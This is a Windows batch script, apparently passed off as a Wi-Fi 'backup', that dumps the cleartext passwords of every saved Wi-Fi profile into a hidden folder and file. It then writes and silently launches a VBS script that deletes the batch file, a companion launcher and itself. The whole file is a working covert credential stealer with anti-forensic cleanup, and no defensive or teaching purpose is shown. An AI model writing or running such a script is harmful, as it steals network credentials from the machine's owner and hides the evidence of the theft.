@echo off
setlocal enabledelayedexpansion

:: Hidden folder and file path
set "folderName=.wifi_dump_hidden"
set "savePath=.\%folderName%"
set "outputFile=%savePath%\wifi_passwords.txt"

:: Create hidden folder if not exists
mkdir "%savePath%" >nul 2>&1
attrib +h "%savePath%"

:: Clear previous output file
if exist "%outputFile%" del "%outputFile%"

:: Loop through saved Wi-Fi profiles and dump credentials
for /f "tokens=*" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "line=%%i"
    call :DumpProfile
)

:: Hide the output file
attrib +h "%outputFile%"

:: Create self-deleting VBS script
echo Set fso = CreateObject("Scripting.FileSystemObject") > selfdelete.vbs
echo WScript.Sleep 3000 >> selfdelete.vbs
echo fso.DeleteFile "wifi_backup.bat", True >> selfdelete.vbs
echo fso.DeleteFile "launcher.vbs", True >> selfdelete.vbs
echo fso.DeleteFile "selfdelete.vbs", True >> selfdelete.vbs

:: Run the VBS silently to delete files after short delay
start /min "" wscript.exe selfdelete.vbs

exit

:DumpProfile
setlocal enabledelayedexpansion
set "profile=!line:*All User Profile     : =!"
>> "%outputFile%" echo ---------------------------------------
>> "%outputFile%" echo Network: !profile!
netsh wlan show profile name="!profile!" key=clear | findstr /c:"Key Content" >> "%outputFile%"
endlocal
goto :eof
